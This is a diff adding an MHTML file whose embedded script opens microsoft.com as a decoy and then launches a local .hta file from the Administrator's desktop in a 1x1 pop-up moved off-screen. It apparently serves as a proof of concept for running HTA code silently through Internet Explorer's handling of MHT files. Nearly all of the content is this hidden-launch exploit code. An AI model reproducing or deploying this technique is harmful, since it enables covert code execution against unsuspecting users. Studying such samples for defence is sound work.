@@ -1,0 +1,38 @@
+From:
+Subject:
+Date:
+MIME-Version: 1.0
+Content-Type: multipart/related; type="text/html";
+boundary="=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001"
+This is a multi-part message in MIME format.
+
+
+--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001
+Content-Type: text/html; charset="UTF-8"
+Content-Location: DOOM
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
+"http://www.w3.org/TR/html4/transitional.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+</head>
+<body>
+
+
+<script>
+win=window
+win.open("http://www.microsoft.com","","width=600,height=600")
+var args = ['height='+1,'width='+1,].join(',')
+setTimeout("", 3000)
+var pop = win.open('C:\Users\Administrator\Desktop\test.hta', 'pop',
+args)
+pop.moveTo(2000,2000)
+</script>
+
+
+</body>
+</html>
+
+
+--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001--
